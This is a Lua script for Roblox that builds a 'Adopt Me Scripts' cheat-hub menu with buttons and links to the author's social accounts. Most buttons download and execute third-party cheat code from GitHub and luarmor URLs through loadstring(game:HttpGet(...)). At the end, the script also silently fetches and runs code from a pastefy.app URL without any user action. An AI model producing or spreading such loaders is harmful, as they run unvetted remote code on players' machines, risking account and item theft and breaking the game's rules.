-- ⚔️ Adopt Me GUI phụ (Blade Ball GUI modified)

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local setclipboard = setclipboard or toclipboard or set_clipboard

-- click sound
local function click(parent)
local s=Instance.new("Sound")
s.SoundId="rbxassetid://876939830"
s.Volume=1
s.Parent=parent
s:Play()
game:GetService("Debris"):AddItem(s,2)
end

-- remove old gui
local old = playerGui:FindFirstChild("AdoptMeMenu")
if old then old:Destroy() end

-- GUI
local gui=Instance.new("ScreenGui",playerGui)
gui.Name="AdoptMeMenu"
gui.ResetOnSpawn=false

-- main frame
local frame=Instance.new("Frame",gui)
frame.AnchorPoint=Vector2.new(0.5,0.5)
frame.Position=UDim2.new(0.5,0,0.5,0)
frame.Size=UDim2.new(0,330,0,270)
frame.BackgroundColor3=Color3.fromRGB(30,32,38)
frame.BackgroundTransparency=0.05
frame.BorderSizePixel=0
Instance.new("UICorner",frame).CornerRadius=UDim.new(0,12)

-- border
local border=Instance.new("UIStroke",frame)
border.Color=Color3.fromRGB(120,170,255)
border.Thickness=1.5
border.Transparency=0.4

-- title bar
local titleBar=Instance.new("Frame",frame)
titleBar.Size=UDim2.new(1,0,0,30)
titleBar.BackgroundTransparency=1

local title=Instance.new("TextLabel",titleBar)
title.Size=UDim2.new(1,-60,1,0)
title.Position=UDim2.new(0,10,0,0)
title.BackgroundTransparency=1
title.Font=Enum.Font.GothamBold
title.TextSize=16
title.Text="🐶 Adopt Me Scripts"
title.TextColor3=Color3.fromRGB(220,255,220)
title.TextXAlignment="Left"

-- hide button
local hideBtn=Instance.new("TextButton",titleBar)
hideBtn.Size=UDim2.new(0,35,0,25)
hideBtn.Position=UDim2.new(1,-40,0.5,-12)
hideBtn.Text="-"
hideBtn.Font=Enum.Font.GothamBold
hideBtn.TextSize=20
hideBtn.TextColor3=Color3.new(1,1,1)
hideBtn.BackgroundColor3=Color3.fromRGB(50,55,70)
Instance.new("UICorner",hideBtn).CornerRadius=UDim.new(0,6)

-- scroll
local scroll=Instance.new("ScrollingFrame",frame)
scroll.Size=UDim2.new(1,-20,1,-90)
scroll.Position=UDim2.new(0,10,0,35)
scroll.BackgroundTransparency=1
scroll.ScrollBarThickness=5

local list=Instance.new("UIListLayout",scroll)
list.Padding=UDim.new(0,6)
list.HorizontalAlignment="Center"

-- button function
local function createBtn(text,url,premium,copy)

local btn=Instance.new("TextButton",scroll)
btn.Size=UDim2.new(0.92,0,0,32)
btn.Text=text
btn.Font=Enum.Font.GothamMedium
btn.TextSize=14
btn.TextColor3=Color3.fromRGB(235,235,235)
btn.AutoButtonColor=false
Instance.new("UICorner",btn).CornerRadius=UDim.new(0,7)

if premium then

btn.BackgroundColor3=Color3.fromRGB(60,60,70)

local g=Instance.new("UIGradient",btn)
g.Color=ColorSequence.new{
ColorSequenceKeypoint.new(0,Color3.fromRGB(255,120,220)),
ColorSequenceKeypoint.new(1,Color3.fromRGB(120,180,255))
}

else

btn.BackgroundColor3=Color3.fromRGB(42,45,52)

local stroke=Instance.new("UIStroke",btn)
stroke.Color=Color3.fromRGB(120,170,255)
stroke.Transparency=0.5
stroke.Thickness=1

end

btn.MouseButton1Click:Connect(function()

click(btn)

TweenService:Create(btn,TweenInfo.new(.1),{Size=UDim2.new(0.95,0,0,34)}):Play()
task.wait(.1)
TweenService:Create(btn,TweenInfo.new(.1),{Size=UDim2.new(0.92,0,0,32)}):Play()

if copy then

if setclipboard then
setclipboard("www.tiktok.com/@renan1627")
end

game.StarterGui:SetCore("SendNotification",{
Title="Copied!",
Text="Follow my TikTok for updates!",
Duration=5
})

else

if url then
loadstring(game:HttpGet(url))()
end

end

end)

scroll.CanvasSize=UDim2.new(0,0,0,list.AbsoluteContentSize.Y+10)

end

-- Adopt Me scripts
createBtn("INF Hub","https://raw.githubusercontent.com/INF-Hub-PL/AdoptMeSpawner/refs/heads/main/PetSpawner")
createBtn("Jazzedd Hub (best choice)","https://raw.githubusercontent.com/jazzedd/JazradScript/refs/heads/main/Script")
createBtn("R4m Hub (need key)","https://raw.githubusercontent.com/r4mpage4/LuaCom/refs/heads/main/r4mpage.gay")
createBtn("Rage Hub (need key)","https://api.luarmor.net/files/v3/loaders/875033288c5e99d576622aced60a0c44.lua")

createBtn("Ikai Hub (Premium)",nil,true,true)
createBtn("Soseiwe Hub (Premium)",nil,true,true)

-- socials
local socialFrame=Instance.new("Frame",frame)
socialFrame.Size=UDim2.new(1,-20,0,30)
socialFrame.Position=UDim2.new(0,10,1,-35)
socialFrame.BackgroundTransparency=1

local layout=Instance.new("UIListLayout",socialFrame)
layout.FillDirection="Horizontal"
layout.Padding=UDim.new(0,8)
layout.HorizontalAlignment="Center"

local socials={
{name="TikTok",color=Color3.fromRGB(255,0,128),link="www.tiktok.com/@renan1627"},
{name="YouTube",color=Color3.fromRGB(255,0,0),link="https://www.youtube.com/@Dearax-f9v"},
{name="Discord",color=Color3.fromRGB(114,137,218),link="https://discord.gg/RbhFbKbABe"}
}

for _,s in pairs(socials) do

local b=Instance.new("TextButton",socialFrame)
b.Size=UDim2.new(0.3,0,1,0)
b.Text=s.name
b.Font=Enum.Font.GothamBold
b.TextSize=13
b.TextColor3=Color3.new(1,1,1)
b.BackgroundColor3=s.color
Instance.new("UICorner",b).CornerRadius=UDim.new(0,6)

b.MouseButton1Click:Connect(function()

click(b)

if setclipboard then
setclipboard(s.link)
end

game.StarterGui:SetCore("SendNotification",{
Title="Copied!",
Text=s.name.." link copied.",
Duration=4
})

end)

end

-- reopen button
local reopen=Instance.new("TextButton",gui)
reopen.Size=UDim2.new(0,45,0,45)
reopen.Position=UDim2.new(0,20,0.7,0)
reopen.Text="≡"
reopen.Visible=false
reopen.Font=Enum.Font.GothamBold
reopen.TextSize=20
reopen.TextColor3=Color3.new(1,1,1)
reopen.BackgroundColor3=Color3.fromRGB(50,55,70)
Instance.new("UICorner",reopen).CornerRadius=UDim.new(1,0)

-- open/close animation
hideBtn.MouseButton1Click:Connect(function()
click(hideBtn)

TweenService:Create(frame,TweenInfo.new(.25,Enum.EasingStyle.Quad),{
Size=UDim2.new(0,0,0,0),
BackgroundTransparency=1
}):Play()

task.wait(.25)

frame.Visible=false
reopen.Visible=true
end)

reopen.MouseButton1Click:Connect(function()
click(reopen)

frame.Visible=true
reopen.Visible=false

frame.Size=UDim2.new(0,0,0,0)

TweenService:Create(frame,TweenInfo.new(.25,Enum.EasingStyle.Back),{
Size=UDim2.new(0,330,0,270),
BackgroundTransparency=0.05
}):Play()
end)

-- drag
local function makeDraggable(obj)

local dragging=false
local dragInput
local start
local startPos

obj.InputBegan:Connect(function(input)
if input.UserInputType==Enum.UserInputType.MouseButton1 then
dragging=true
start=input.Position
startPos=obj.Position
end
end)

obj.InputChanged:Connect(function(input)
if input.UserInputType==Enum.UserInputType.MouseMovement then
dragInput=input
end
end)

UIS.InputChanged:Connect(function(input)

if input==dragInput and dragging then

local delta=input.Position-start

obj.Position=UDim2.new(
startPos.X.Scale,
startPos.X.Offset+delta.X,
startPos.Y.Scale,
startPos.Y.Offset+delta.Y
)

end

end)

UIS.InputEnded:Connect(function(input)
if input.UserInputType==Enum.UserInputType.MouseButton1 then
dragging=false
end
end)

end

makeDraggable(frame)
makeDraggable(reopen)

-- run adopt me main script AFTER gui loads
task.wait(1)
pcall(function()
loadstring(game:HttpGet("https://pastefy.app/ZnqReme0/raw", true))()
end)
